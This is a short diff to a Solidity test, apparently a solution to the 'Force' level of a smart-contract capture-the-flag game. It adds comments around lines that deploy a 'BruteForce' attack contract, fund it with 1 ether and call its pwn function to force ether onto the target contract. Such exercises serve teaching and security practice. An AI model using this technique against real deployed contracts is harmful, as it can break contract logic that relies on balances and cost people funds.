@@ -47,11 +47,14 @@ contract ForceTest is DSTest {
     //                             Start Level Attack
     //--------------------------------------------------------------------------------
     
-    // deploy 
+    // deploy the malicious contract
     BruteForce bruteForce = new BruteForce();
+
+    // fund the contract with 1 ether
     address(bruteForce).call{value: 1 ether}("");
     assertEq(address(bruteForce).balance, 1 ether);
 
+    // call our pwn function to force the ether onto the target
     bruteForce.pwn(address(forceContract));
 
     //--------------------------------------------------------------------------------
